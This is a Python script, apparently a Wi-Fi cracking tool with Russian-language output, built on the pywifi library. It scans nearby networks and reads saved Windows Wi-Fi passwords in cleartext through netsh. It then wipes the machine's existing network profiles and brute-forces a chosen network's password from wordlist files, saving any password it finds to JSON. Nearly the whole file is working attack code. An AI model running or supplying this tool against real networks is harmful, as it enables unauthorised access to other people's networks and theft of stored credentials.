import platform
import subprocess
from contextlib import nullcontext

from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import time

from path_utils import save_in_json


def scan_wifi():
    wifi = PyWiFi() 
    iface = wifi.interfaces()[0]  

    iface.scan() 
    time.sleep(2)  

    try:
        results = iface.scan_results()  
    except:
        return None

    wifi_list = []
    for network in results:
        wifi_list.append({
            "SSID": network.ssid,
            "Signal": network.signal, 
            "Auth": network.auth,  
            "Cipher": network.cipher 
        })
    return wifi_list

def get_wifi_profile():
    system = platform.system()

    if system != "Windows":
        return None

    output = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8")
    lines = output.split('\n')

    profiles = []
    for line in lines:
        if "Все профили пользователей" in line:
            profile = line.split(":")[1].strip()
            profiles.append(profile)

    results = []
    for profile in profiles:
        command = f"netsh wlan show profile name=\"{profile}\" key=clear"
        output = subprocess.check_output(command, shell=True).decode("utf-8")
        password_line = [line.split(":")[1].strip() for line in output.split('\n') if "Содержимое ключа" in line]

        if password_line:
            password = password_line[0]
            results.append([profile, password])

    return results

def print_wifi_profiles(profiles):
    for profile in profiles:
        ssid, password = profile
        print(f"SSID: {ssid}")
        print(f"Password: {password}")
        print()

def wifi_clear():
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.disconnect()
    ifaces.remove_all_network_profiles()

    time.sleep(3)

def get_interfaces():
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    return iface

def password_correct(ssid, password):
    ifaces = get_interfaces()

    if ifaces is None:
        print("Wifi-адаптер не найден.")
        exit(1)


    while (len(ifaces.network_profiles()) != 0):
        ifaces.remove_all_network_profiles()

    new_profile = set_wifi_profile(ssid, password)
    added_profile = ifaces.add_network_profile(new_profile)
    ifaces.connect(added_profile)

    start_time = time.time()
    status = None

    while (True):
        status = ifaces.status()
        if status == const.IFACE_CONNECTED:
            return True
        time.sleep(0.1)
        if time.time() - start_time > 0.5:
            return False

def crack_passwords(ssid, files):
    count_all_password = 0
    count_good_password = 0
    for file in files:
        print(f"\n---Считываем файл {file.name}---")
        with open(file, 'r', encoding='utf8') as words:
            for line in words:
                line = line.rstrip("\n")
                password = line
                count_all_password += 1
                print(f"\rПаролей проверено всего: {count_all_password}, проверено вай-файных паролей: {count_good_password}, текущий пароль:{password}", end='', flush=True)
                if len(password) < 8:
                    continue
                count_good_password += 1
                if password_correct(ssid, password):
                    print(f"\nПароль для сети {ssid} найден: {password}")
                    save_in_json({ssid: password})
                    exit(0)

def set_wifi_profile(ssid, password):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    return profile

def back_wifi_profiles(profiles):
    for profile in profiles:
        ssid, password = profile
        set_wifi_profile(ssid, password)

